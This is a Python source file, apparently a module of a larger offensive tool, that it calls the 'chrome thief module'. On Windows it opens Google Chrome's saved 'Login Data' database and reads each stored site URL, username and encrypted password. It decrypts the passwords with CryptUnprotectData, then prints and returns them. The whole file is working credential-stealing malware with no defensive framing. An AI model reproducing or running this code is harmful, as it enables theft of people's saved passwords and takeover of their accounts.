# -*- coding: utf-8 -*-
import os, sys, sqlite3, win32crypt
def get_file_path():
    """
    If the running operating system is Windows,
    returns the local path of the database file
    :return: Path of the database file
    """
    if os.name == "nt":
        # windows path
        path = os.getenv('localappdata') +\
               '\\Google\\Chrome\\User Data\\Default\\'
        if not os.path.isdir(path):
            # if directory doesn't exist,
            # Chrome is not installed on the machine
            print ("Chrome isn't installed on this machine!")  # raise error
            sys.exit(0) ##??
        else:
            return path
    else:
        print ("Supporting only Windows Operating System!")
        sys.exit(0)   #??


def read_data(db_path):
    """
    Fetches the datas from database file.
    :param db_path: Local path of the database file
    :return: Database table records
    """
    try:
        cn = sqlite3.connect(db_path + "Login Data")
        # Login Data is the database file name
        cursor = cn.cursor()
        r = cursor.execute('select action_url, username_value, password_value '
                           'from logins')
        rows = r.fetchall()
        cn.close()
        return rows
    except sqlite3.OperationalError as err:
        err = str(err)
        if err == 'database is locked':
            print ("Can't get datas while Google Chrome is running!")
        else:
            print ('Error : ' + err)
        sys.exit(0)


def print_list(auth_list):
    """
    Prints the username-password list to the console
    :param auth_list: List that contains username,
    password and url informations
    """
    list_of_data = []
    print ('*' * 15 + str(len(auth_list)) + ' passwords found!' + '*' * 15)
    for auth_info in auth_list:
#        print ('Link : ' + auth_info['link'])
#        print ('User name : ' + auth_info['username'])
#        print ('Password : ' + str(auth_info['password']))
#        print ('*' * 30)
        list_of_data.append(['Link : ' + auth_info['link'], 'User name : ' + auth_info['username'], 'Password : ' + str(auth_info['password'])])
    return list_of_data
        
def main():
    data_list = read_data(get_file_path())
    auth_list = []  # result list
    for data in data_list:
        # decrypting the password
        password = win32crypt.CryptUnprotectData(data[2], None, None,
                                                 None, 0)[1]
        if password:
            auth_list.append({'link': data[0], 'username': data[1],
                              'password': password})
    if len(auth_list) > 0:
        pk = print_list(auth_list)
        print(pk)   # list of usernames/p.words
    else:
        print ("Couldn't find a stored password on Google Chrome")
    return str(auth_list)  
    
  
def run():
    print('[*] In the chrome thief module')
    main()